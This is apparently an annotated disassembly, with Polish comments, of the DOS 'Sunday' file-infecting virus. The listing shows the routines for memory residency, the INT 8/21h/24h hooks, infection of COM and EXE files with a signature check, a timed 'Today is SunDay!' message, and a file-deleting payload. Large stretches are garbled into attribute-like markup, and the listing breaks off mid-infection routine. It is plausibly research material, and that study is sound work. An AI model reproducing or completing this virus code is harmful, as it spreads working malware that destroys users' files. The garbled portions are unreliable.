

;       COM - na poczatku
;       EXE - na koncu
;       rozpoznaje wg nazwy (co nie COM = EXE)
;-------
;       aktywacja w niedziele roku roznego od 1989
;       procedury niszczacej
;-------
;       doniesienia co 30 minut
;       ale nigdy nie wlaczone
;-------
;       Nie zaraza COMMAND.COM'a
;-------

LF      EQU     0AH
CR      EQU     0DH

;INITIAL VALUES :       CS:IP   0918:00C4
;                       SS:SP   0918:065D

;----------------
; <- tutaj="" cialo="" programu="" ;----------------="" s9180="" segment="" stack="" assume="" ds:s9180,="" ss:s9180="" ,cs:s9180="" ,es:s9180="" l9180:="" jmp="" l0095="" ;l9215="" ;9180="" e9="" 92="" 00="" db="" 73h,55h="" ;'su'="" ;9183="" 73="" 55=""></-><- wzorzec="" sygnatury="" zarazenia="" l0005="" db="" 0c8h,0f7h,0e1h,0eeh,0e7h="" ;9185="" c8="" f7="" e1="" ee="" e7="" l000a="" dw="" 100h="" ;ip="" nosiciela="" com="" ;918a="" 00="" 01="" l000c="" dw="" 1905h="" ;cs="" nosiciela="" com="" ;918c="" 05="" 19="" l000e="" db="" 0="" ;ptr="" aktywnosci="" wirusa="" ;918e="" 00="" l000f="" dw="" 0="" ;918f="" 00="" 00="" l0011="" dw="" 9374h="" ;dlugosc="" programu="" oryginalna="" ;9191="" 74="" 93="" l0013="" dw="" 0fea5h="" ;old="" int="" 8="" ;9193="" a5="" l0015="" dw="" 0f000h="" ;9195="" 00="" l0017="" dw="" 1460h="" ;old="" int="" 21h="" ;9197="" 60="" 14="" l0019="" dw="" 025bh="" ;9199="" 5b="" 02="" l001b="" dw="" 0556h="" ;old="" int="" 24h="" ;919b="" 56="" 05="" l001d="" dw="" 0ba6h="" ;919d="" a6="" 0b="" l001f="" dw="" 32400="" ;30="" minut="" zwloki="" ;919f="" 90="" 7e="" dw="" 0="" ;91a1="" 00="" 00="" dw="" 0="" ;91a3="" 00="" 00="" dw="" 0="" ;91a5="" 00="" 00="" dw="" 0="" ;91a7="" 00="" 00="" dw="" 0="" ;91a9="" 00="" 00="" dw="" 0="" ;91ab="" 00="" 00="" dw="" 0e800h="" ;91ad="" 00="" e8="" dw="" 5f06h="" ;91af="" 06="" 5f="" l0031="" dw="" 0c89h="" ;adres="" bloku="" wirusa="" ;91b1="" 89="" 0c="" l0033="" dw="" 80h="" ;wielkosc="" bloku="" wirusa="" (para)="" ;91b3="" 80="" 00=""></-><----- parameter="" block="" l0035="" dw="" 0="" ;environment="" ;91b5="" 00="" 00="" dw="" 80h=""></-----><- command="" line="" ;91b7="" 80="" 00="" l0039="" dw="" 0c89h="" ;="" segment="" ;91b9="" 89="" 0c="" dw="" 5ch=""></-><- fcb-1="" ;91bb="" 5c="" 00="" l003d="" dw="" 0c89h="" ;="" segment="" ;91bd="" 89="" 0c="" dw="" 6ch=""></-><- fcb-2="" ;91bf="" 6c="" 00="" l0041="" dw="" 0c89h="" ;="" segment="" ;91c1="" 89="" 0c="" l0043="" dw="" 0800h="" ;sp="" nosiciela="" ;91c3="" 00="" 08="" l0045="" dw="" 0a58h="" ;rel="" segment="" stosu="" nosiciela="" ;91c5="" 58="" 0a="" l0047="" dw="" 3d73h="" ;ip="" nosiciela="" ;91c7="" 73="" 3d="" l0049="" dw="" 0="" ;cs="" nosiciela="" (rel)="" ;91c9="" 00="" 00="" ;pierwsze="" 3="" bajty="" wektora="" int="" ff="" l004b="" dw="" 0f000h="" ;91cb="" 00="" f0="" l004d="" db="" 46h="" ;91cd="" 46="" l004e="" db="" 1="" ;0="COM," 1="EXE" ;91ce="" 01=""></-><- bufor="" na="" poczatek="" zbioru="" l004f="" db="" 'mz'="" ;91cf="" 4d="" 5a="" l0051="" dw="" 01e4h="" ;last="" page="" bytes="" ;91d1="" e4="" 01="" l0053="" dw="" 004dh="" ;file="" size="" -="" pages="" ;91d3="" 4d="" 00="" dw="" 0004h="" ;91d5="" 04="" 00="" l0057="" dw="" 0020h="" ;header="" size="" (para)="" ;91d7="" 20="" 00="" dw="" 01c1h="" ;91d9="" c1="" 01="" dw="" 0ffffh="" ;91db="" ff="" ff="" l005d="" dw="" 0918h="" ;ss="" ;91dd="" 18="" 09="" l005f="" dw="" 065dh="" ;sp="" ;91df="" 5d="" 06="" l0061="" dw="" 1984h="" ;suma="" kontrolna="" ;91e1="" 84="" 19="" l0063="" dw="" 00c4h="" ;ip="" ;91e3="" c4="" 00="" l0065="" dw="" 0918h="" ;cs="" ;91e5="" 18="" 09="" dw="" 001eh="" ;91e7="" 1e="" 00="" dw="" 0000h="" ;91e9="" 00="" 00=""></-><- bufor="" na="" 5="" ostatnich="" bajtow="" zbioru="" l006b="" db="" 0ah,0,0ffh,0ffh,0ffh="" ;91eb="" 0a="" 00="" ff="" ff="" ff="" l0070="" dw="" 5="" ;file="" handle="" ;91f0="" 05="" 00="" l0072="" dw="" 20h="" ;atrybut="" zarazanego="" zbioru="" ;91f2="" 20="" 00="" l0074="" dw="" 1031h="" ;91f4="" 31="" 10="" l0076="" dw="" 0a337h="" ;91f6="" 37="" a3="" l0078="" dw="" 200h="" ;bytes/sector(page)="" ;91f8="" 00="" 02="" l007a="" dw="" 10h="" ;bytes/paragraph="" ;91fa="" 10="" 00="" l007c="" dw="" 9380h="" ;nowa="" dlugosc="" zbioru="" dword="" ;91fc="" 80="" 93="" l007e="" dw="" 0="" ;91fd="" 00="" 00="" l0080="" dw="" 41b9h="" ;path="" nazwy="" programu="" -="" offset="" ;9200="" b9="" 41="" l0082="" dw="" 9b2ah="" ;="" -="" segment="" ;9202="" 2a="" 9b="" l0084="" db="" 'command.com'="" ;9294="" 43="" 4f="" 4d="" 4d="" 41="" 4e="" 44="" 2e="" 43="" 4f="" 4d="" l008f="" dw="" 0,0,0="" ;929f="" 00="" 00="" 00="" 00="" 00="" 00="" ;="===============================================" ;=""></-><- start="" wirusa="" zbiorow="" com="" ;------------------------------------------------="" l0095:="" cld="" ;9215="" fc="" mov="" ah,0ffh="" ;kontrola="" rezydowania="" ;9216="" b4="" ff="" int="" 21h="" ;9218="" cd="" 21="" cmp="" ah,0ffh="" ;921a="" 80="" fc="" ff="" jnb="" l9234="" ;-=""> nie rezyduje                ;921D 73 15
        CMP     AH,4                                            ;921F 80 FC 04
        JB      L9234           ;-> nie rezyduje                ;9222 72 10
                                ;<- wirus="" juz="" rezyduje="" mov="" ah,0ddh="" ;uruchom="" program="" ;9224="" b4="" dd="" mov="" di,100h="" ;miejsce="" docelowe="" programu="" ;9226="" bf="" 00="" 01="" mov="" si,offset="" l065f="" ;9229="" be="" 5f="" 06="" add="" si,di="" ;miejsce="" aktualne="" programu="" ;922c="" 03="" f7="" mov="" cx,cs:[di+11h]="" ;dlugosc="" programu="" oryginalna="" ;922e="" 2e="" 8b="" 4d="" 11="" int="" 21h="" ;9232="" cd="" 21="" l9234:="" mov="" ax,cs="" ;normalizacja="" segmentu="" ;9234="" 8c="" c8="" add="" ax,10h="" ;9236="" 05="" 10="" 00="" mov="" ss,ax="" ;9239="" 8e="" d0="" mov="" sp,offset="" l065d="" ;923b="" bc="" 5d="" 06="" push="" ax="" ;segment="" ;923e="" 50="" mov="" ax,offset="" l00c4="" ;="L9244" ;923f="" b8="" c4="" 00="" push="" ax="" ;offset="" ;9242="" 50="" retf="" ;9243="" cb="" ;="===============================================" ;=""></-><- start="" wirusa="" zbioru="" exe="" ;------------------------------------------------="" l00c4:="" l9244:="" cld="" ;9244="" fc="" push="" es=""></-><- psp="" ;9245="" 06="" mov="" cs:l0031,es="" ;9246="" 2e="" 8c="" 06="" 31="" 00="" mov="" cs:l0039,es="" ;924b="" 2e="" 8c="" 06="" 39="" 00="" mov="" cs:l003d,es="" ;9250="" 2e="" 8c="" 06="" 3d="" 00="" mov="" cs:l0041,es="" ;9255="" 2e="" 8c="" 06="" 41="" 00="" mov="" ax,es="" ;segment="" poczatku="" pgm="" ;925a="" 8c="" c0="" add="" ax,10h="" ;925c="" 05="" 10="" 00="" add="" cs:l0049,ax="" ;relokowanie="" cs="" ;925f="" 2e="" 01="" 06="" 49="" 00="" add="" cs:l0045,ax="" ;relokowanie="" ss="" ;9264="" 2e="" 01="" 06="" 45="" 00="" mov="" ah,0ffh="" ;czy="" juz="" rezyduje="" ;9269="" b4="" ff="" int="" 21h="" ;926b="" cd="" 21="" cmp="" ah,4="" ;926d="" 80="" fc="" 04="" jnz="" l9282="" ;-=""> jeszcze nie         ;9270 75 10

        POP     ES                      ;<- uruchomienie="" pgm="" ;9272="" 07="" mov="" ss,cs:l0045="" ;inicjacja="" stosu="" ;9273="" 2e="" 8e="" 16="" 45="" 00="" mov="" sp,cs:l0043="" ;9278="" 2e="" 8b="" 26="" 43="" 00="" jmp="" dword="" ptr="" cs:l0047="" ;uruchomienie="" nosiciela="" ;927d="" 2e="" ff="" 2e="" 47="" 00=""></-><- zarezydowanie="" l9282:="" xor="" ax,ax="" ;9282="" 33="" c0="" mov="" es,ax="" ;9284="" 8e="" c0="" mov="" bx,03fch="" ;int="" 0ffh="" ;9286="" bb="" fc="" 03="" mov="" ax,es:[bx]="" ;9289="" 26="" 8b="" 07="" mov="" cs:l004b,ax="" ;928c="" 2e="" a3="" 4b="" 00="" mov="" al,es:[bx+2]="" ;9290="" 26="" 8a="" 47="" 02="" mov="" cs:l004d,al="" ;9294="" 2e="" a2="" 4d="" 00="" mov="" word="" ptr="" es:[bx],0a5f3h="" ;rep="" movsw="" ;9298="" 26="" c7="" 07="" f3="" a5="" mov="" byte="" ptr="" es:[bx+2],0cbh="" ;ret="" ;929d="" 26="" c6="" 47="" 02="" cb="" pop="" ax="" ;92a2="" 58="" add="" ax,10h="" ;92a3="" 05="" 10="" 00="" mov="" es,ax="" ;92a6="" 8e="" c0="" push="" cs="" ;92a8="" 0e="" pop="" ds="" ;92a9="" 1f="" mov="" cx,offset="" l065f="" ;dl.="" wir.="" bez="" podpisu="" ;92aa="" b9="" 5f="" 06="" shr="" cx,1="" ;na="" slowa="" ;92ad="" d1="" e9="" xor="" si,si="" ;offset="" zrodlowy="" ;92af="" 33="" f6="" mov="" di,si="" ;offset="" wynikowy="" ;92b1="" 8b="" fe="" push="" es="" ;segment="" przepisanego="" ;92b3="" 06="" mov="" ax,offset="" l013c="" ;offset="" kontynuacji="" ;92b4="" b8="" 3c="" 01="" push="" ax="" ;92b7="" 50="" jmp="" dword="" ptr="" l05f6="" ;skok="" w="" wektor="" int="" ff="" ;92b8="" ff="" 2e="" f6="" 05=""></-><- kontynuacja="" na="" nowym="" miejscu="" l013c:="" mov="" ax,cs="" ;92bc="" 8c="" c8="" mov="" ss,ax="" ;92be="" 8e="" d0="" mov="" sp,offset="" l065d="" ;92c0="" bc="" 5d="" 06="" xor="" ax,ax="" ;92c3="" 33="" c0="" mov="" ds,ax="" ;92c5="" 8e="" d8="" mov="" ax,cs:l004b="" ;odtworzenie="" wektora="" int="" ff="" ;92c7="" 2e="" a1="" 4b="" 00="" mov="" [bx],ax="" ;92cb="" 89="" 07="" mov="" al,cs:l004d="" ;92cd="" 2e="" a0="" 4d="" 00="" mov="" [bx+2],al="" ;92d1="" 88="" 47="" 02="" mov="" bx,sp="" ;sp="" -=""> paragraf                 ;92D4 8B DC
        MOV     CL,4                                            ;92D6 B1 04
        SHR     BX,CL                                           ;92D8 D3 EB
        ADD     BX,20h          ;+512                           ;92DA 83 C3 20
        and     bx,0fff0h                                       ;92DD 83 E3 F0
        MOV     CS:L0033,BX     ;paragrafy bloku potrzebne      ;92E0 2E 89 1E 33 00
        MOV     AH,4AH          ;Set Block                      ;92E5 B4 4A
        MOV     ES,CS:L0031     ;segment bloku                  ;92E7 2E 8E 06 31 00
        INT     21H                                             ;92EC CD 21
        MOV     AX,3521h        ;Get int 21h                    ;92EE B8 21 35
        INT     21H                                             ;92F1 CD 21
        MOV     CS:L0017,BX                                     ;92F3 2E 89 1E 17 00
        MOV     CS:L0019,ES                                     ;92F8 2E 8C 06 19 00
        PUSH    CS                                              ;92FD 0E
        POP     DS                                              ;92FE 1F
        MOV     DX,OFFSET L02D2                                 ;92FF BA D2 02
        MOV     AX,2521h        ;Set int 21h                    ;9302 B8 21 25
        INT     21H                                             ;9305 CD 21
        MOV     ES,[L0031]      ;segment wirusa                 ;9307 8E 06 31 00
        MOV     ES,ES:[2Ch]     ;environment                    ;930B 26 8E 06 2C 00
        XOR     DI,DI           ;szukamy nazwy nosiciela        ;9310 33 FF
        MOV     CX,7FFFh                                        ;9312 B9 FF 7F
        XOR     AL,AL                                           ;9315 32 C0
L9317:  REPNZ   SCASB                                           ;9317 F2 AE
        CMP     ES:[DI],AL                                      ;9319 26 38 05
        LOOPNZ  L9317                                           ;931C E0 F9
        MOV     DX,DI           ;pathname offset                ;931E 8B D7
        ADD     DX,3                                            ;9320 83 C2 03

        MOV     AX,4B00h        ;Load & Execute nosiciela       ;9323 B8 00 4B
        PUSH    ES                                              ;9326 06
        POP     DS              ;pathname segment               ;9327 1F
        PUSH    CS                                              ;9328 0E
        POP     ES              ;parameter block                ;9329 07
        MOV     BX,OFFSET L0035 ;parameter block                ;932A BB 35 00
        PUSH    DS                                              ;932D 1E
        PUSH    ES                                              ;932E 06
        PUSH    AX                                              ;932F 50
        PUSH    BX                                              ;9330 53
        PUSH    CX                                              ;9331 51
        PUSH    DX                                              ;9332 52
        MOV     AH,2AH          ;Get Date                       ;9333 B4 2A
        INT     21H                                             ;9335 CD 21
        MOV     BYTE PTR CS:L000E,0     ;ptr aktywnosci wirusa  ;9337 2E C6 06 0E 00 00
        CMP     CX,1989         ;rok                            ;933D 81 F9 C5 07
        JZ      L936F           ;-> tak                         ;9341 74 2C

; Mistake! Range for AL is 0 ..6 !

        CMP     AL,7            ;niedziela ?                    ;9343 3C 07
        JNZ     L9350           ;-> nie                         ;9345 75 09
        INC     BYTE PTR CS:L000E       ;ptr aktywnosci wirusa  ;9347 2E FE 06 0E 00
        JMP     SHORT   L936F                                   ;934C EB 21

        NOP                                                     ;934E 90
        NOP                                                     ;934F 90

        ;<- to="" nie="" niedziela="" i="" rok="" nie="" 1989="" l9350:="" mov="" ax,3508h="" ;get="" int="" 8="" ;9350="" b8="" 08="" 35="" int="" 21h="" ;9353="" cd="" 21="" mov="" cs:l0013,bx="" ;9355="" 2e="" 89="" 1e="" 13="" 00="" mov="" cs:l0015,es="" ;935a="" 2e="" 8c="" 06="" 15="" 00="" push="" cs="" ;935f="" 0e="" pop="" ds="" ;9360="" 1f="" mov="" word="" ptr="" l001f,32400="" ;30="" minut="" ;9361="" c7="" 06="" 1f="" 00="" 90="" 7e="" mov="" ax,2508h="" ;set="" int="" 8="" ;9367="" b8="" 08="" 25="" mov="" dx,offset="" l0216="" ;936a="" ba="" 16="" 02="" int="" 21h="" ;936d="" cd="" 21="" l936f:="" pop="" dx="" ;936f="" 5a="" pop="" cx="" ;9370="" 59="" pop="" bx="" ;9371="" 5b="" pop="" ax="" ;9372="" 58="" pop="" es="" ;9373="" 07="" pop="" ds="" ;9374="" 1f="" pushf="" ;9375="" 9c="" call="" dword="" ptr="" cs:l0017="" ;old="" int="" 21h="" (run)="" ;9376="" 2e="" ff="" 1e="" 17="" 00="" push="" ds="" ;937b="" 1e="" pop="" es="" ;937c="" 07="" mov="" ah,49h="" ;free="" allocated="" memory="" ;937d="" b4="" 49="" int="" 21h="" ;937f="" cd="" 21="" mov="" ah,4dh="" ;get="" return="" code="" of="" child="" proc="" ;9381="" b4="" 4d="" int="" 21h="" ;9383="" cd="" 21="" mov="" ah,31h="" ;keep="" process="" ;9385="" b4="" 31="" mov="" dx,offset="" l065f="" ;adres="" konca="" ;9387="" ba="" 5f="" 06="" mov="" cl,4="" ;na="" paragrafy="" ;938a="" b1="" 04="" shr="" dx,cl="" ;938c="" d3="" ea="" add="" dx,10h="" ;zaokraglenie="" ;938e="" 83="" c2="" 10="" int="" 21h="" ;9391="" cd="" 21="" ;-----------------------------------------------="" ;="" wlasna="" obsluga="" int="" 24h="" ;-----------------------------------------------="" l0213:="" xor="" ax,ax="" ;9393="" 33="" c0="" iret="" ;9395="" cf="" ;="===============================================================" ;="" nowa="" obsluga="" int="" 8="" ;----------------------------------------------------------------="" l0216:="" cmp="" byte="" ptr="" cs:l000e,1="" ;ptr="" aktywnosci="" wirusa="" ;9396="" 2e="" 80="" 3e="" 0e="" 00="" 01="" jnz="" l93cc="" ;-=""> to nie sobota               ;939C 75 2E
        CMP     WORD PTR CS:L001F,0                             ;939E 2E 83 3E 1F 00 00
        JNZ     L93C7           ;-> jeszcze mamy czas           ;93A4 75 21
        PUSH    AX                                              ;93A6 50
        PUSH    BX                                              ;93A7 53
        PUSH    SI                                              ;93A8 56
        MOV     AH,0EH          ;                               ;93A9 B4 0E
        MOV     BL,1FH          ;atrybut                        ;93AB B3 1F
        LEA     SI,L0251        ;'Today is SunDay...'           ;93AD 8D 36 51 02
L93B1:  MOV     AL,CS:[SI]      ;znak                           ;93B1 2E 8A 04
        CMP     AL,'$'          ;koniec ?                       ;93B4 3C 24
        JZ      L93BD           ;-> tak                         ;93B6 74 05
        INT     10H                                             ;93B8 CD 10
        INC     SI                                              ;93BA 46
        JMP     SHORT   L93B1                                   ;93BB EB F4

L93BD:  MOV     WORD PTR CS:L001F,32400 ;reset licznika na 30min;93BD 2E C7 06 1F 00 90 7E
        POP     SI                                              ;93C4 5E
        POP     BX                                              ;93C5 5B
        POP     AX                                              ;93C6 58
L93C7:  DEC     WORD PTR CS:L001F       ;licznik zwloki         ;93C7 2E FF 0E 1F 00
L93CC:  JMP     DWORD PTR CS:L0013      ;oryginal int 8         ;93CC 2E FF 2E 13 00

L0251   DB      'Today is SunDay! Why do you work so hard?',LF,CR
        DB      'All  work and no play make you a dull boy!',LF,CR
        DB      "Come on ! Let's go out and have some fun!$"

;================================================================
;       Nowa obsluga int 21h
;----------------------------------------------------------------
L02D2:  PUSHF                                                   ;9452 9C
        CMP     AH,0FFH         ;czy to pytanie o wirusa ?      ;9453 80 FC FF
        JNZ     L945D           ;-> nie                         ;9456 75 05
        MOV     AX,0400h        ;sygnalizacja obecnosci         ;9458 B8 00 04
        POPF                                                    ;945B 9D
        IRET                                                    ;945C CF

L945D:  CMP     AH,0DDH         ;uruchomienie nosiciela COM ?   ;945D 80 FC DD
        JZ      L9470           ;-> tak                         ;9460 74 0E
        CMP     AX,4B00h        ;Load & Execute ?               ;9462 3D 00 4B
        JNZ     L946A           ;-> nie, przezroczystosc        ;9465 75 03
        JMP     SHORT   L949E   ;-> tak                         ;9467 EB 35

        NOP                                                     ;9469 90

L946A:  POPF                                                    ;946A 9D
        JMP     DWORD PTR CS:L0017      ;old int 21h            ;946B 2E FF 2E 17 00

L9470:  POP     AX              ;<- 0ddh,="" uruchom="" nosiciela="" com="" ;9470="" 58="" pop="" ax="" ;9471="" 58="" mov="" ax,0100h="" ;ip="" ;9472="" b8="" 00="" 01="" mov="" cs:l000a,ax="" ;9475="" 2e="" a3="" 0a="" 00="" pop="" ax="" ;cs="" ;9479="" 58="" mov="" cs:l000c,ax="" ;947a="" 2e="" a3="" 0c="" 00="" repz="" movsb="" ;przeslanie="" programu="" na="" wirusa="" ;947e="" f3="" a4="" popf="" ;9480="" 9d="" mov="" ax,cs:l000f="" ;?="" ;9481="" 2e="" a1="" 0f="" 00="" jmp="" dword="" ptr="" cs:l000a="" ;9485="" 2e="" ff="" 2e="" 0a="" 00=""></-><- uruchamianie="" programu="" w="" fazie="" aktywnosci="" l948a:="" xor="" cx,cx="" ;948a="" 33="" c9="" mov="" ax,4301h="" ;set="" file="" attributes="" ;948c="" b8="" 01="" 43="" int="" 21h="" ;948f="" cd="" 21="" mov="" ah,41h="" ;delete="" directory="" entry="" ;9491="" b4="" 41="" int="" 21h="" ;9493="" cd="" 21="" mov="" ax,4b00h="" ;load="" &="" execute="" ;9495="" b8="" 00="" 4b="" popf="" ;9498="" 9d="" jmp="" dword="" ptr="" cs:l0017="" ;old="" int="" 21h="" ;9499="" 2e="" ff="" 2e="" 17="" 00=""></-><- uruchamianie="" programu="" l949e:="" cmp="" byte="" ptr="" cs:l000e,1="" ;ptr="" aktywnosci="" wirusa="" ;949e="" 2e="" 80="" 3e="" 0e="" 00="" 01="" jz="" l948a="" ;-=""> aktywny             ;94A4 74 E4
        MOV     WORD PTR CS:L0070,0FFFFh        ;File handle    ;94A6 2E C7 06 70 00 FF FF
        MOV     WORD PTR CS:L008F,0                             ;94AD 2E C7 06 8F 00 00 00
        MOV     CS:L0080,DX             ;path do programu       ;94B4 2E 89 16 80 00
        MOV     CS:L0082,DS                                     ;94B9 2E 8C 1E 82 00
        PUSH    AX                                              ;94BE 50
        PUSH    BX                                              ;94BF 53
        PUSH    CX                                              ;94C0 51
        PUSH    DX                                              ;94C1 52
        PUSH    SI                                              ;94C2 56
        PUSH    DI                                              ;94C3 57
        PUSH    DS                                              ;94C4 1E
        PUSH    ES                                              ;94C5 06
        CLD                                                     ;94C6 FC
        MOV     DI,DX                                           ;94C7 8B FA
        XOR     DL,DL                   ;aktualny drive         ;94C9 32 D2
        CMP     BYTE PTR [DI+1],':'     ;czy path z drive ?     ;94CB 80 7D 01 3A
        JNZ     L94D6                   ;-> nie, aktualny       ;94CF 75 05
        MOV     DL,[DI]                                         ;94D1 8A 15
        AND     DL,1FH                  ;na numer drive         ;94D3 80 E2 1F
L94D6:  MOV     AH,36H          ;Get Disk Free Space            ;94D6 B4 36
        INT     21H                                             ;94D8 CD 21
        CMP     AX,0FFFFh                                       ;94DA 3D FF FF
        JNZ     L94E2           ;-> drive number OK             ;94DD 75 03
L94DF:  JMP     L9768           ;<- drive="" number="" invalid="" ;94df="" e9="" 86="" 02="" l94e2:="" mul="" bx=""></-><sec per="" clus="">*<avl clus="">      ;94E2 F7 E3
        MUL     CX              ;*<bytes per="" sec="">               ;94E4 F7 E1
        OR      DX,DX                                           ;94E6 0B D2
        JNZ     L94EF           ;-> ponad 64 KB wolne           ;94E8 75 05
        CMP     AX,OFFSET L065F ;=1631=dlugosc wirusa           ;94EA 3D 5F 06
        JB      L94DF                                           ;94ED 72 F0
L94EF:  MOV     DX,CS:L0080     ;path do programu               ;94EF 2E 8B 16 80 00
        PUSH    DS                                              ;94F4 1E
        POP     ES                                              ;94F5 07
        XOR     AL,AL           ;poszukiwanie konca             ;94F6 32 C0
        MOV     CX,41h                                          ;94F8 B9 41 00
        REPNZ   SCASB                                           ;94FB F2 AE
        MOV     SI,CS:L0080     ;zamiana na duze litery         ;94FD 2E 8B 36 80 00
L9502:  MOV     AL,[SI]                                         ;9502 8A 04
        OR      AL,AL                                           ;9504 0A C0
        JZ      L9516                                           ;9506 74 0E
        CMP     AL,61H                  ;'a'                    ;9508 3C 61
        JB      L9513                                           ;950A 72 07
        CMP     AL,7AH                  ;'z'                    ;950C 3C 7A
        JA      L9513                                           ;950E 77 03
        SUB     BYTE PTR [SI],20H       ;' '                    ;9510 80 2C 20
L9513:  INC     SI                                              ;9513 46
        JMP     SHORT   L9502                                   ;9514 EB EC

L9516:  MOV     CX,0Bh          ;czy to command ?               ;9516 B9 0B 00
        SUB     SI,CX                                           ;9519 2B F1
        MOV     DI,OFFSET L0084 ;'command.com'                  ;951B BF 84 00
        PUSH    CS                                              ;951E 0E
        POP     ES                                              ;951F 07
        MOV     CX,0Bh                                          ;9520 B9 0B 00
        REPZ    CMPSB                                           ;9523 F3 A6
        JNZ     L952A           ;-> nie                         ;9525 75 03
        JMP     L9768           ;-> tak, odpuszczamy            ;9527 E9 3E 02

L952A:  MOV     AX,4300h        ;Get File Attributes            ;952A B8 00 43
        INT     21H                                             ;952D CD 21
        JB      L9536                                           ;952F 72 05
        MOV     CS:L0072,CX     ;atrybut zarazanego zbioru      ;9531 2E 89 0E 72 00
L9536:  JB      L955D                                           ;9536 72 25
        XOR     AL,AL           ;znacznik zbioru COM            ;9538 32 C0
        MOV     CS:L004E,AL     ;0=COM, 1=EXE                   ;953A 2E A2 4E 00
        PUSH    DS              ;szukamy konca nazwy            ;953E 1E
        POP     ES                                              ;953F 07
        MOV     DI,DX                                           ;9540 8B FA
        MOV     CX,41h                                          ;9542 B9 41 00
        REPNZ   SCASB                                           ;9545 F2 AE
        CMP     BYTE PTR [DI-2],4DH     ;'M'-ostatnia litera    ;9547 80 7D FE 4D
        JZ      L9558                   ;-> tak, COM            ;954B 74 0B
        CMP     BYTE PTR [DI-2],6DH     ;'m'                    ;954D 80 7D FE 6D
        JZ      L9558                   ;-> tak, com            ;9551 74 05
        INC     BYTE PTR CS:L004E       ;<- exe="" ;9553="" 2e="" fe="" 06="" 4e="" 00="" l9558:="" mov="" ax,3d00h="" ;open="" handle="" ;9558="" b8="" 00="" 3d="" int="" 21h="" ;955b="" cd="" 21="" l955d:="" jb="" l95b9="" ;955d="" 72="" 5a="" mov="" cs:l0070,ax="" ;file="" handle="" ;955f="" 2e="" a3="" 70="" 00="" mov="" bx,ax="" ;9563="" 8b="" d8="" mov="" ax,4202h="" ;move="" file="" ptr="" eof+offs="" ;9565="" b8="" 02="" 42="" mov="" cx,0ffffh="" ;-5="" (piec="" ostatnich="" bajtow)="" ;9568="" b9="" ff="" ff="" mov="" dx,0fffbh="" ;956b="" ba="" fb="" ff="" int="" 21h="" ;956e="" cd="" 21="" jb="" l955d="" ;9570="" 72="" eb="" add="" ax,5="" ;+5="" bajtow="" sygnatury="" ;9572="" 05="" 05="" 00="" mov="" cs:l0011,ax="" ;dlugosc="" programu="" oryginalna="" ;9575="" 2e="" a3="" 11="" 00="" mov="" cx,5="" ;dlugosc="" sygnatury="" ;9579="" b9="" 05="" 00="" mov="" dx,offset="" l006b="" ;bufor="" na="" sygnature="" ;957c="" ba="" 6b="" 00="" mov="" ax,cs="" ;957f="" 8c="" c8="" mov="" ds,ax="" ;9581="" 8e="" d8="" mov="" es,ax="" ;9583="" 8e="" c0="" mov="" ah,3fh="" ;read="" handle="" ;9585="" b4="" 3f="" int="" 21h="" ;9587="" cd="" 21="" mov="" di,dx="" ;przeczytana="" sygnatura="" ;9589="" 8b="" fa="" mov="" si,offset="" l0005="" ;wzorzec="" sygnatury="" ;958b="" be="" 05="" 00="" repz="" cmpsb="" ;958e="" f3="" a6="" jnz="" l9599="" ;-=""> jeszcze nie zarazony        ;9590 75 07
        MOV     AH,3EH          ;Close Handle                   ;9592 B4 3E
        INT     21H                                             ;9594 CD 21
        JMP     L9768                                           ;9596 E9 CF 01

        ;<----- zarazanie="" zbioru="" l9599:="" mov="" ax,3524h="" ;get="" int="" 24h="" ;9599="" b8="" 24="" 35="" int="" 21h="" ;959c="" cd="" 21="" mov="" l001b,bx="" ;959e="" 89="" 1e="" 1b="" 00="" mov="" l001d,es="" ;95a2="" 8c="" 06="" 1d="" 00="" mov="" dx,offset="" l0213="" ;l9393="" ;95a6="" ba="" 13="" 02="" mov="" ax,2524h="" ;set="" int="" 24h="" ;95a9="" b8="" 24="" 25="" int="" 21h="" ;95ac="" cd="" 21="" lds="" dx,dword="" ptr="" l0080="" ;ptr="" na="" path="" ;95ae="" c5="" 16="" 80="" 00="" xor="" cx,cx="" ;95b2="" 33="" c9="" mov="" ax,4301h="" ;set="" file="" attributes="" ;95b4="" b8="" 01="" 43="" int="" 21h="" ;95b7="" cd="" 21="" l95b9:="" jb="" l95f6="" ;95b9="" 72="" 3b="" mov="" bx,cs:l0070="" ;file="" handle="" ;95bb="" 2e="" 8b="" 1e="" 70="" 00="" mov="" ah,3eh="" ;close="" handle="" ;95c0="" b4="" 3e="" int="" 21h="" ;95c2="" cd="" 21="" mov="" word="" ptr="" cs:l0070,0ffffh="" ;file="" handle="" ;95c4="" 2e="" c7="" 06="" 70="" 00="" ff="" ff="" mov="" ax,3d02h="" ;open="" handle="" r/w="" ;95cb="" b8="" 02="" 3d="" int="" 21h="" ;95ce="" cd="" 21="" jb="" l95f6="" ;95d0="" 72="" 24="" mov="" cs:l0070,ax="" ;file="" handle="" ;95d2="" 2e="" a3="" 70="" 00="" mov="" ax,cs="" ;95d6="" 8c="" c8="" mov="" ds,ax="" ;95d8="" 8e="" d8="" mov="" es,ax="" ;95da="" 8e="" c0="" mov="" bx,l0070="" ;file="" handle="" ;95dc="" 8b="" 1e="" 70="" 00="" mov="" ax,5700h="" ;get="" file="" date/time="" ;95e0="" b8="" 00="" 57="" int="" 21h="" ;95e3="" cd="" 21="" mov="" l0074,dx="" ;95e5="" 89="" 16="" 74="" 00="" mov="" l0076,cx="" ;95e9="" 89="" 0e="" 76="" 00="" mov="" ax,4200h="" ;move="" file="" ptr="" bof+offs="" ;95ed="" b8="" 00="" 42="" xor="" cx,cx="" ;95f0="" 33="" c9="" mov="" dx,cx="" ;95f2="" 8b="" d1="" int="" 21h="" ;95f4="" cd="" 21="" l95f6:="" jb="" l9636="" ;95f6="" 72="" 3e="" cmp="" byte="" ptr="" l004e,0="" ;0="COM," 1="EXE" ;95f8="" 80="" 3e="" 4e="" 00="" 00="" jz="" l9603="" ;95fd="" 74="" 04="" jmp="" short="" l965c="" ;95ff="" eb="" 5b="" nop="" ;9601="" 90="" nop="" ;9602="" 90=""></-----><----- zarazenie="" com'a="" l9603:="" mov="" bx,1000h="" ;zadanie="" 64kb="" bufora="" pamieci="" ;9603="" bb="" 00="" 10="" mov="" ah,48h="" ;allocate="" memory="" ;9606="" b4="" 48="" int="" 21h="" ;9608="" cd="" 21="" jnb="" l9617="" ;-=""> powiodlo sie                ;960A 73 0B
        MOV     AH,3EH          ;Close Handle                   ;960C B4 3E
        MOV     BX,L0070        ;File handle                    ;960E 8B 1E 70 00
        INT     21H                                             ;9612 CD 21
        JMP     L9768                                           ;9614 E9 51 01

L9617:  INC     WORD PTR L008F                                  ;9617 FF 06 8F 00
